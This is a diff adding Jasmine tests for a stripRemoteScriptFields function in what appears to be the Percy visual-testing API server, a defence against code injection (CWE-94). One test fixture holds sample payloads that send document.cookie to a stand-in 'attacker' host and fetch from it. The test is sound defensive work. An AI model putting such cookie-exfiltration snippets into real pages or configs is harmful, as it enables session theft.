@@ -3,7 +3,7 @@ import PercyConfig from '@percy/config';
 import { logger, setupTest, fs } from './helpers/index.js';
 import Percy from '@percy/core';
 import WebdriverUtils from '@percy/webdriver-utils';
-import { getPercyDomPath, _applyHttpReadOnlyStripping } from '../src/api.js';
+import { getPercyDomPath, _applyHttpReadOnlyStripping, stripRemoteScriptFields } from '../src/api.js';
 
 describe('API Server', () => {
   let percy;
@@ -1884,6 +1884,58 @@ describe('_applyHttpReadOnlyStripping', () => {
     let result = _applyHttpReadOnlyStripping(body, [], log);
 
     expect(result).toBe(body);
+    expect(log.warn).not.toHaveBeenCalled();
+  });
+});
+
+describe('stripRemoteScriptFields', () => {
+  afterEach(() => { delete process.env.PERCY_ALLOW_REMOTE_SCRIPTS; });
+
+  it('removes execute and domTransformation from a network snapshot body (CWE-94)', () => {
+    let log = { warn: jasmine.createSpy('warn') };
+    let body = {
+      url: 'https://example.com',
+      name: 'test',
+      domTransformation: '(function(el){new Image().src="https://attacker/x?c="+document.cookie})',
+      execute: { beforeSnapshot: 'fetch("https://attacker/y")' },
+      additionalSnapshots: [{ name: 'extra', execute: 'steal()' }]
+    };
+    let result = stripRemoteScriptFields(body, log);
+
+    expect(result.domTransformation).toBeUndefined();
+    expect(result.execute).toBeUndefined();
+    expect(result.additionalSnapshots[0].execute).toBeUndefined();
+    // non-code fields are preserved, and the original body is not mutated
+    expect(result.url).toEqual('https://example.com');
+    expect(result.name).toEqual('test');
+    expect(result.additionalSnapshots[0].name).toEqual('extra');
+    expect(body.domTransformation).toBeDefined();
+    expect(log.warn).toHaveBeenCalledWith(jasmine.stringMatching(/Ignoring `execute`, `domTransformation`/));
+  });
+
+  it('leaves a body without code fields unchanged and does not warn', () => {
+    let log = { warn: jasmine.createSpy('warn') };
+    let body = { url: 'https://example.com', name: 'clean', widths: [1000] };
+    let result = stripRemoteScriptFields(body, log);
+
+    expect(result).toEqual(body);
+    expect(log.warn).not.toHaveBeenCalled();
+  });
+
+  it('preserves code fields when PERCY_ALLOW_REMOTE_SCRIPTS=true', () => {
+    process.env.PERCY_ALLOW_REMOTE_SCRIPTS = 'true';
+    let log = { warn: jasmine.createSpy('warn') };
+    let body = { name: 'test', execute: 'doThing()' };
+    let result = stripRemoteScriptFields(body, log);
+
+    expect(result.execute).toEqual('doThing()');
+    expect(log.warn).not.toHaveBeenCalled();
+  });
+
+  it('tolerates non-object bodies', () => {
+    let log = { warn: jasmine.createSpy('warn') };
+    expect(stripRemoteScriptFields(undefined, log)).toBeUndefined();
+    expect(stripRemoteScriptFields('str', log)).toEqual('str');
     expect(log.warn).not.toHaveBeenCalled();
   });
 });
